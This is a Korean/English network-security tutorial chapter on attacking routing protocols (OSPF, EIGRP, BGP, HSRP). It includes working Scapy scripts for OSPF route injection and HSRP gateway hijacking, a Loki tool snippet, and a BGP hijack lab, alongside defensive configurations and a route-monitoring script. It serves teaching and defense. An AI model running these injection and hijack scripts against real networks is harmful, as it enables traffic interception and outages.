> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)

---

<a name="한국어"></a>

# 32-03. 라우팅 프로토콜 공격 — OSPF·EIGRP·BGP·FHRP의 제어 평면 조작

> **한 문장 요약**: 라우팅 프로토콜은 "이웃을 믿는다"를 전제로 설계되었습니다. 인증이 없거나 약하면 공격자의 LSA 한 장이 전체 라우팅 테이블을 바꿔버릴 수 있습니다.

## 1. 왜 라우팅 공격이 치명적인가

Layer 2 공격이 브로드캐스트 도메인을 노린다면, 라우팅 공격은 **여러 네트워크 세그먼트 전체의 트래픽 흐름**을 바꿉니다. 한 대의 라우터만 잡거나, 라우터처럼 행세할 수 있으면:

- 피해자 네트워크의 모든 아웃바운드 트래픽을 자기 쪽으로 유도 (Sinkhole)
- Null 라우트를 주입해 특정 서비스 DoS
- MITM 위치 확보 — TLS 없는 내부 트래픽 복호화

2008년 **파키스탄 텔레콤이 YouTube 트래픽을 BGP로 블랙홀링**한 사건, 2018년 **Amazon Route 53 BGP 하이재킹**, 2024년 미국 통신사를 표적으로 한 중국계 APT의 BGP 조작 의혹 등 — 실제 국가급 공격의 단골 메뉴입니다.

## 2. 위협 모델 정리

| 프로토콜 | 사용 계층 | 인증 옵션 | 공격자 요구 조건 |
|----------|-----------|-----------|------------------|
| OSPF | IGP | MD5/SHA (선택) | 같은 브로드캐스트 도메인 참여 |
| EIGRP | IGP (Cisco) | MD5 (선택) | 같은 브로드캐스트 도메인 참여 |
| BGP | EGP | TCP MD5, TTL 보안 (선택) | BGP 피어 관계 수립 가능 |
| HSRP | 게이트웨이 중복 | 평문/MD5 (취약) | 같은 L2 세그먼트 |
| VRRP | 게이트웨이 중복 | 평문/단순/IPsec | 같은 L2 세그먼트 |

**인증이 "선택"** 이라는 부분에 주목하세요. 운영자 편의와 디버깅 난이도 때문에 실제로 인증이 꺼져 있는 경우가 흔합니다.

## 3. OSPF 공격

### 3.1 OSPF 기본 재확인

OSPF는 **Link State Advertisement(LSA)** 를 교환해 각 라우터가 전체 토폴로지 그래프를 구축합니다. 같은 area의 라우터들이 **같은 LSDB(Link State Database)** 를 가져야 경로 계산이 수렴합니다.

LSA가 위조되면 LSDB가 오염되고, 각 라우터가 SPF를 다시 돌려 잘못된 경로를 최단으로 고릅니다.

### 3.2 공격 시나리오: 가짜 라우터 주입 + 블랙홀

공격자는 OSPF hello를 보내 이웃이 된 뒤, Type-1 Router LSA를 위조해 "내가 10.0.0.0/8의 비용 1 경로를 가지고 있다"고 주장합니다. 주변 라우터들이 이 주장을 받아들이면 모든 10.0.0.0/8 트래픽이 공격자로 몰립니다.

### 3.3 Scapy로 OSPF Hello + LSU 주입

```python
#!/usr/bin/env python3
"""ospf_route_injection.py — OSPFv2 가짜 라우터 출현 + 악성 LSA 주입.

전제:
    - scapy.contrib.ospf 를 사용한다 (scapy 2.5+ 에서 기본 포함)
    - 같은 OSPF 영역에 연결 가능한 인터페이스가 있어야 한다
    - 타깃 라우터의 OSPF 인증이 꺼져있거나 MD5 키를 안다
"""
from __future__ import annotations

import argparse
import time

from scapy.all import sendp, sniff, Ether, IP
from scapy.contrib.ospf import (
    OSPF_Hdr,
    OSPF_Hello,
    OSPF_LSUpd,
    OSPF_Router_LSA,
    OSPF_Link,
)

# OSPF의 All-OSPF-Routers 멀티캐스트
OSPF_MCAST_IP = "224.0.0.5"
OSPF_MCAST_MAC = "01:00:5e:00:00:05"


def build_hello(src_mac: str, src_ip: str, area: int) -> Ether:
    """OSPF Hello 프레임.

    hello는 10초 주기(기본)로 송신되어 이웃 관계를 유지한다.
    타깃이 우리 hello를 받고 이웃 목록에 추가하면 LSA 교환이 가능해진다.
    """
    return (
        Ether(src=src_mac, dst=OSPF_MCAST_MAC) /
        # IP protocol 89 = OSPF, TTL 1로 설정해 한 홉만 가도록
        IP(src=src_ip, dst=OSPF_MCAST_IP, ttl=1, proto=89) /
        OSPF_Hdr(
            version=2,
            type=1,                                    # Hello
            src=src_ip,                                # 자기 Router ID
            area=area,                                 # 타깃과 같은 area
            authtype=0,                                # 0 = No authentication
            authdata=0,
        ) /
        OSPF_Hello(
            mask="255.255.255.0",                      # 네트워크 마스크
            hellointerval=10,                          # 타깃 설정과 일치시켜야 이웃 됨
            options=0x02,                              # E-bit (External OK)
            prio=0,                                    # DR 선거에 참여 안 함 (공격자는 조용히)
            deadinterval=40,                           # hello 4회 연속 미수신 시 이웃 drop
            router="0.0.0.0",                          # DR 정보 (자기 자신은 비워둠)
            backup="0.0.0.0",                          # BDR 정보
            neighbors=[],                              # 알고 있는 이웃 목록
        )
    )


def build_lsu_malicious(
    src_mac: str,
    src_ip: str,
    area: int,
    fake_router_id: str,
    malicious_link: tuple[str, str, int],
) -> Ether:
    """LSU(Link State Update) 프레임 — 악성 Router LSA 포함.

    malicious_link:
        (링크_ID, 링크_데이터, 비용) 튜플
        Type-1 Router LSA에서 이 링크가 "내가 이 prefix로 가는 비용이 N이다"를 주장한다.
    """
    link_id, link_data, cost = malicious_link

    # Router LSA 빌드: Type-1
    router_lsa = OSPF_Router_LSA(
        id=fake_router_id,                             # 이 LSA를 발생시킨 라우터 ID
        adrouter=fake_router_id,                       # Advertising Router
        seq=0x80000001,                                # LSA 시퀀스 — 높을수록 최신
        flags=0x00,                                    # V/E/B 비트
        linkcount=1,                                   # 링크 개수
        linklist=[
            # Link type 3 = Stub Network (prefix 선언)
            # 이렇게 하면 "이 prefix를 비용 cost 로 도달 가능"을 전파
            OSPF_Link(id=link_id, data=link_data, type=3, metric=cost),
        ],
    )

    return (
        Ether(src=src_mac, dst=OSPF_MCAST_MAC) /
        IP(src=src_ip, dst=OSPF_MCAST_IP, ttl=1, proto=89) /
        OSPF_Hdr(
            version=2,
            type=4,                                    # LSU
            src=src_ip,
            area=area,
            authtype=0,
            authdata=0,
        ) /
        OSPF_LSUpd(
            lsacount=1,                                # LSA 1개 포함
            lsalist=[router_lsa],
        )
    )


def main() -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument("-i", "--iface", required=True)
    ap.add_argument("--src-mac", required=True, help="공격자 MAC")
    ap.add_argument("--src-ip", required=True, help="공격자 IP (OSPF 세그먼트)")
    ap.add_argument("--router-id", required=True, help="가짜 라우터 ID (32비트 IP 형식)")
    ap.add_argument("--area", type=lambda x: int(x, 0), default=0, help="OSPF area")
    ap.add_argument("--prefix", required=True, help="주입할 prefix 네트워크 주소")
    ap.add_argument("--mask", required=True, help="prefix 마스크")
    ap.add_argument("--cost", type=int, default=1, help="링크 비용 — 낮을수록 경로 선호")
    args = ap.parse_args()

    # 1단계: Hello 를 3번 보내 이웃 관계를 수립
    hello = build_hello(args.src_mac, args.src_ip, args.area)
    for i in range(3):
        sendp(hello, iface=args.iface, verbose=False)
        print(f"[+] Hello sent ({i+1}/3)")
        time.sleep(10)                                 # hello 주기에 맞춤

    # 2단계: 악성 LSU 송신
    lsu = build_lsu_malicious(
        args.src_mac, args.src_ip, args.area,
        args.router_id,
        (args.prefix, args.mask, args.cost),
    )
    # 여러 번 반복 송신 — LSA flooding 에서 살아남도록
    for i in range(5):
        sendp(lsu, iface=args.iface, verbose=False)
        print(f"[+] Malicious LSU sent ({i+1}/5)")
        time.sleep(2)

    print(f"[*] 타깃 라우터에서 'show ip ospf database router' 로 주입된 LSA 확인")
    print(f"[*] 'show ip route' 에서 {args.prefix}/{args.mask} 경로가 공격자를 경유하는지 확인")


if __name__ == "__main__":
    main()
```

### 3.4 CVE-2025-61105 — FRRouting OSPF 디버그 DoS

2025년 공개된 CVE-2025-61105 는 FRRouting의 **OSPF 디버그 덤프 로직** 처리 중 원격 DoS를 유발합니다. 공격자가 특정 OSPF 패킷을 보내면 `debug ospf packet detail` 이 활성화된 FRR 인스턴스에서 크래시.

**현장 교훈**: 운영 라우터에 디버그를 **영구적으로** 켜놓는 경우가 생각보다 많습니다 (장애 원인 추적 편의). 바로 이런 상황이 공격면이 됩니다.

**방어**:
- FRRouting을 패치 버전으로 업그레이드
- 원격 관리용 VRF가 아닌 글로벌에서 디버그 금지
- `service policy-map` 또는 CoPP로 OSPF 패킷 레이트 리밋

### 3.5 OSPF 인증 — 왜 MD5도 예전만큼 좋지 않은가

전통적인 OSPF MD5 키는:
- **사전 브루트포스 가능**: 공격자가 hello를 스니핑해서 MD5 해시를 잡고, 오프라인 크랙 시도
- **Replay 공격 부분 취약**: 시퀀스 번호가 있지만 완벽하지 않음

현대적 선택:
- **OSPFv3 + IPsec** (IPv6): AH 또는 ESP로 인증·무결성
- **OSPF HMAC-SHA-256** (RFC 5709): 더 강한 해시

## 4. EIGRP 공격 — Cisco 전용 IGP

### 4.1 EIGRP 특성

Cisco가 개발해 RFC 7868로 2016년에야 표준화한 IGP. 특징:
- **Metric 복잡**: 대역폭·지연·부하·신뢰도의 가중합
- **Neighbor discovery**: 멀티캐스트 224.0.0.10
- **인증 옵션**: MD5 / SHA (소프트웨어 버전 따라)

### 4.2 공격 — Route Injection via Update Packet

원리는 OSPF와 유사합니다. 가짜 이웃이 되고, Update 패킷에 원하는 prefix를 넣어 낮은 metric으로 전파.

도구: **`relay`** 또는 **`loki`** 둘 다 EIGRP 모듈 제공. 직접 짜는 것보다 성숙한 도구를 쓰는 편이 안정적입니다.

```bash
# Loki 실행
git clone https://github.com/raizo62/loki_on_kali.git
cd loki_on_kali && sudo python3 loki_gtk.py
# EIGRP 탭 → Hello → 이웃 되기 → Update 탭에서 prefix 추가
```

### 4.3 방어

```
! EIGRP 인증 (MD5 예시)
key chain EIGRP-KEYS
 key 1
  key-string SuperSecretKey2026!
  accept-lifetime 00:00:00 Jan 1 2026 infinite
  send-lifetime   00:00:00 Jan 1 2026 infinite

interface GigabitEthernet0/0
 ip authentication mode eigrp 100 md5
 ip authentication key-chain eigrp 100 EIGRP-KEYS

! 추가로 패시브 인터페이스 — LAN 사용자 방향에선 EIGRP 송신 금지
router eigrp 100
 passive-interface GigabitEthernet0/1
```

## 5. BGP 공격 — 인터넷 전체의 아킬레스건

### 5.1 BGP 위협 모델

BGP는 서로 다른 AS 간 라우팅 프로토콜이라 **공격자가 BGP 피어**가 될 수 있어야 합니다. 일반 공격자는 접근이 어렵지만, 다음 경로가 실제 존재합니다:

- **ISP 내부자**: 피어 설정을 직접 만짐
- **손상된 라우터**: 이미 침투한 에지 라우터를 이용해 BGP 업데이트 조작
- **잘못된 Route Filter**: 고객 AS가 실수로 상위 AS prefix를 광고하면 전 세계가 받음 (Route Leak)
- **RPKI 미적용 환경**: Origin 검증이 없어서 IP 가로채기 쉬움

### 5.2 CVE-2025-20115 — IOS XR BGP Confederation Crash

2025년 공개. 공격자가 AS_CONFED_SEQUENCE 속성에 **AS 번호 255개 이상** 이 들어간 BGP Update를 주입하면 타깃 IOS XR 라우터의 BGP 프로세스가 메모리 손상으로 크래시.

**재현 조건**:
- 타깃이 BGP confederation 구성
- 공격자가 confederation 멤버이거나, 손상된 피어로 접근 가능

**실전적 시사점**: AS_CONFED_SEQUENCE 길이에 대한 파싱 경계 검사 누락 — 이게 2025년에도 발견된다는 사실이 **라우팅 데몬의 성숙도가 생각보다 낮다**는 방증입니다.

### 5.3 BGP 하이재킹 데모 — GNS3 랩

실전에서 BGP를 건드리는 건 법적 파괴력이 막대하므로, 반드시 **완전히 격리된 랩**에서만 실습합니다.

```
[AS 100] ─── [AS 200] ─── [AS 300]
공격자 AS      중간 AS       피해자 AS

피해자가 광고: 203.0.113.0/24
공격자가 주입: 203.0.113.0/25 (더 specific prefix)

BGP 선호 규칙: longest prefix match → /25 가 이김
→ 203.0.113.0~127 트래픽이 공격자 AS로 유입
```

### 5.4 방어 — RPKI + Peer Lock + Route Filter

**RPKI (Resource Public Key Infrastructure)**:
- IP 블록 소유자가 "이 prefix는 AS N만 광고 가능" 이라고 서명한 ROA(Route Origin Authorization) 발급
- BGP 스피커가 받은 경로의 origin AS와 ROA를 대조
- 불일치 시 drop 또는 낮은 preference

```
! Cisco IOS XE BGP에서 RPKI validator 등록
router bgp 64500
 bgp rpki server tcp 10.0.0.10 port 323 refresh 600
 address-family ipv4 unicast
  bgp bestpath prefix-validate allow-invalid       ! 점진 도입 시
  ! 프로덕션에서는 allow-invalid 제거하고 invalid는 drop
```

**Max Prefix 제한**:
```
router bgp 64500
 neighbor 10.0.0.2 maximum-prefix 1000 80 restart 30
 ! 1000개 초과 시 경고, 실제로 1250개(125%)되면 세션 차단, 30분 후 자동 복구
```

## 6. FHRP(HSRP/VRRP) 하이재킹

### 6.1 FHRP 개념

**First Hop Redundancy Protocol** — 한 서브넷에 여러 라우터가 있을 때 가상 IP/MAC을 두고 활성 라우터를 선출합니다. 사용자는 그 가상 IP만 게이트웨이로 쓰면 됩니다.

- **HSRP (Cisco 독자)**: UDP 1985, Active/Standby
- **VRRP (표준)**: IP protocol 112, Master/Backup

### 6.2 공격 원리

HSRP hello에는 **priority** 필드가 있습니다. 더 높은 priority를 주장하면 자기가 Active가 됩니다. 기본값은 100이고 평문 비밀번호(`cisco`가 기본)만 맞추면 통과합니다.

Active가 된 공격자는 가상 IP의 소유주 — 모든 디폴트 게이트웨이 트래픽이 자기 포트로 옵니다.

### 6.3 Scapy 기반 HSRP 하이재킹

```python
#!/usr/bin/env python3
"""hsrp_hijack.py — HSRPv1 Active 역할 탈취.

전제:
    - 같은 브로드캐스트 도메인에 접근
    - 타깃 HSRP 그룹이 인증 평문 또는 공격자가 해시 크랙 가능
"""
from __future__ import annotations

import argparse
import time

from scapy.all import sendp, Ether, IP, UDP
from scapy.contrib.hsrp import HSRP


# HSRP는 UDP 1985, 모든 HSRP 라우터 멀티캐스트 주소
HSRP_MCAST_IP = "224.0.0.2"
HSRP_MCAST_MAC = "01:00:5e:00:00:02"


def hsrp_hello(
    src_ip: str,
    group: int,
    virtual_ip: str,
    auth: str,
    priority: int = 255,
    state: int = 16,   # 16 = Active
) -> Ether:
    """HSRP Hello 메시지 빌더.

    priority 255 = 최댓값. 타깃이 기본 100이면 우리가 선출된다.
    state 16 = Active — 즉시 Active 역할 주장.
    """
    return (
        Ether(dst=HSRP_MCAST_MAC) /
        IP(src=src_ip, dst=HSRP_MCAST_IP, ttl=1) /    # TTL 1 — 로컬 세그먼트만
        UDP(sport=1985, dport=1985) /
        HSRP(
            version=0,                                 # HSRPv1
            opcode=0,                                  # 0 = Hello
            state=state,
            hellotime=3,                               # hello 주기
            holdtime=10,                               # 이 시간 내 hello 없으면 dead
            priority=priority,                         # 여기가 핵심
            group=group,                               # HSRP 그룹 번호
            auth=auth.encode().ljust(8, b"\x00"),      # 8바이트 고정 길이 평문 인증
            virtualIP=virtual_ip,                      # 가상 IP
        )
    )


def main() -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument("-i", "--iface", required=True)
    ap.add_argument("--src-ip", required=True, help="공격자 실제 IP")
    ap.add_argument("--vip", required=True, help="HSRP 가상 IP")
    ap.add_argument("--group", type=int, required=True, help="HSRP 그룹 번호")
    ap.add_argument("--auth", default="cisco", help="평문 인증 문자열 (기본 'cisco')")
    args = ap.parse_args()

    pkt = hsrp_hello(args.src_ip, args.group, args.vip, args.auth)

    print("[*] Sending HSRP Hello with priority 255 every 3s...")
    # 타깃의 holdtime이 10초인 게 일반적이므로 3초 간격이면 충분히 유지된다
    try:
        while True:
            sendp(pkt, iface=args.iface, verbose=False)
            time.sleep(3)
    except KeyboardInterrupt:
        print("\n[*] Stopped")


if __name__ == "__main__":
    main()
```

### 6.4 방어

- HSRP 인증을 **MD5 key chain** 방식으로 전환 (평문 인증은 신뢰하지 않음)
- `standby X priority 254 preempt` 로 레거시 라우터에 선점 방지
- **가능하면 VRRPv3** 로 전환 — IPsec 인증 옵션

```
interface Vlan 10
 standby 1 ip 10.0.0.1
 standby 1 priority 150
 standby 1 preempt
 standby 1 authentication md5 key-chain HSRP-KEYS
```

## 7. Control Plane Policing (CoPP) — 라우팅 공격의 일반적 완화

라우팅 공격 대부분은 결국 **라우터 CPU에 패킷을 흘려넣는** 방식입니다. CoPP는 **각 프로토콜별로 들어오는 제어 트래픽의 레이트를 제한**합니다.

```
! 클래스 정의
class-map match-any COPP-OSPF
 match protocol ospf
class-map match-any COPP-BGP
 match protocol bgp
class-map match-any COPP-ICMP
 match protocol icmp

! 정책 정의 — 각 클래스별 레이트 리밋
policy-map COPP-POLICY
 class COPP-OSPF
  police rate 500 pps
 class COPP-BGP
  police rate 200 pps
 class COPP-ICMP
  police rate 100 pps burst 50

! 제어 평면에 적용
control-plane
 service-policy input COPP-POLICY
```

## 8. 라우팅 테이블 감시 — 공격 조기 탐지

라우팅 공격은 **비정상 prefix가 라우팅 테이블에 나타나는 순간**이 유일한 실시간 지표입니다. 간단한 감시 스크립트를 넣어두면 조기에 잡을 수 있습니다.

```python
#!/usr/bin/env python3
"""route_watcher.py — 라우팅 테이블 변경을 SSH로 주기적으로 수집해 차이를 경보.

네트워크 장비에 직접 로그 수집 도구를 설치할 수 없을 때 유용한 외부 감시 패턴.
"""
from __future__ import annotations

import argparse
import hashlib
import time
from dataclasses import dataclass

# netmiko는 Cisco/Juniper 등 다양한 벤더 CLI 자동화에 사실상 표준
from netmiko import ConnectHandler


@dataclass
class RouteSnapshot:
    """한 시점의 라우팅 테이블 스냅샷.
    전문(raw)과 해시를 함께 저장 — 변경 감지에는 해시로 충분, 원인 분석에는 원문 필요."""
    ts: float
    raw: str
    digest: str


def collect(device: dict) -> RouteSnapshot:
    """SSH로 장비에 로그인해 'show ip route' 결과를 받아온다."""
    with ConnectHandler(**device) as conn:
        # session_log 미사용 — 필요시 수동으로 추가
        out = conn.send_command("show ip route", use_textfsm=False)

    # SHA256 다이제스트 — 변경 감지의 기준
    digest = hashlib.sha256(out.encode()).hexdigest()
    return RouteSnapshot(ts=time.time(), raw=out, digest=digest)


def diff_and_alert(prev: RouteSnapshot, curr: RouteSnapshot) -> None:
    """두 스냅샷 비교 후 경보 출력."""
    if prev.digest == curr.digest:
        # 변경 없음 — 로그만 남기고 끝
        print(f"[{int(curr.ts)}] no change")
        return

    # 변경이 있으면 라인 단위 diff로 간단히 표시
    import difflib
    diff = list(difflib.unified_diff(
        prev.raw.splitlines(),
        curr.raw.splitlines(),
        lineterm="",
        n=2,  # context 2줄
    ))
    print(f"[{int(curr.ts)}] ROUTING TABLE CHANGED — diff below:")
    for line in diff[:30]:   # 너무 길면 앞 30줄만
        print(f"  {line}")


def main() -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", required=True)
    ap.add_argument("--user", required=True)
    ap.add_argument("--password", required=True)
    ap.add_argument("--device-type", default="cisco_ios",
                    help="netmiko device type (cisco_ios, cisco_xe, cisco_xr, juniper 등)")
    ap.add_argument("--interval", type=int, default=60, help="수집 주기(초)")
    args = ap.parse_args()

    device = {
        "device_type": args.device_type,
        "host": args.host,
        "username": args.user,
        "password": args.password,
        "fast_cli": True,   # 경량 상호작용 — 타임아웃 조정 덜 필요
    }

    prev: RouteSnapshot | None = None
    try:
        while True:
            curr = collect(device)
            if prev is not None:
                diff_and_alert(prev, curr)
            prev = curr
            time.sleep(args.interval)
    except KeyboardInterrupt:
        print("\n[*] Monitoring stopped")


if __name__ == "__main__":
    main()
```

실제 운영에는 Kentik·SolarWinds NTA 같은 전용 제품이 더 좋지만, 빠른 인지 장치로는 이 정도 스크립트로도 효과 있습니다.

## 9. 마무리 — 라우팅 보안 체크리스트

- [ ] IGP(OSPF/EIGRP) 인증 **MD5 이상** 강제, 가능하면 HMAC-SHA
- [ ] BGP **TCP MD5** + GTSM(TTL 255 확인) + max-prefix
- [ ] **RPKI ROA 게시** 및 수신 측 유효성 검증
- [ ] **passive-interface** 로 LAN 방향 IGP 송신 차단
- [ ] **Control Plane Policing** 으로 제어 트래픽 레이트 리밋
- [ ] **디버그 영구 활성화 금지** (CVE-2025-61105 같은 사고 예방)
- [ ] 라우팅 테이블 변화 **주기 감시** + 경보 자동화
- [ ] 주요 CVE 발표 이후 **72시간 내 보안 패치 일정** 수립

다음 문서(04)에서는 **관리 평면** 공격 — SNMP 커뮤니티 스트링 남용, TACACS+ 키 스니핑, NETCONF 취약점, 설정 파일에서 해시 추출 등을 다룹니다.

---

<a name="english"></a>

# 32-03. Routing Protocol Attacks — Control Plane Manipulation of OSPF, EIGRP, BGP, and FHRP

> **One-sentence summary**: Routing protocols are designed on the premise of "trusting neighbors." If authentication is absent or weak, a single LSA from an attacker can change the entire routing table.

## 1. Why Routing Attacks Are Devastating

If Layer 2 attacks target broadcast domains, routing attacks change **traffic flow across entire network segments**. If you can capture just one router, or impersonate one:

- Redirect all outbound traffic from the victim network to your own (Sinkhole)
- Inject null routes to DoS specific services
- Position yourself as an active MITM on all inter-VLAN communication

## Key Attack Vectors

- **OSPF LSA Injection**: Inject false LSAs to manipulate routing tables
- **EIGRP Neighbor Hijacking**: Become an EIGRP neighbor without authentication
- **BGP Route Hijacking**: Announce others' prefixes and redirect traffic
- **HSRP/VRRP Takeover**: Become the default gateway by claiming the highest priority

## 9. Wrap-up — Routing Security Checklist

- [ ] IGP (OSPF/EIGRP) authentication forced at **MD5 or higher**, HMAC-SHA if possible
- [ ] BGP **TCP MD5** + GTSM (TTL 255 check) + max-prefix
- [ ] **RPKI ROA published** and validity checked on receiving side
- [ ] **passive-interface** to block IGP transmission toward LAN
- [ ] **Control Plane Policing** to rate-limit control traffic
- [ ] **Never enable debug permanently** (preventing incidents like CVE-2025-61105)
- [ ] **Periodic monitoring** of routing table changes + automated alerting
- [ ] Establish **security patch schedule within 72 hours** after major CVE announcements

The next document (04) covers **management plane** attacks — SNMP community string abuse, TACACS+ key sniffing, NETCONF vulnerabilities, hash extraction from configuration files, etc.
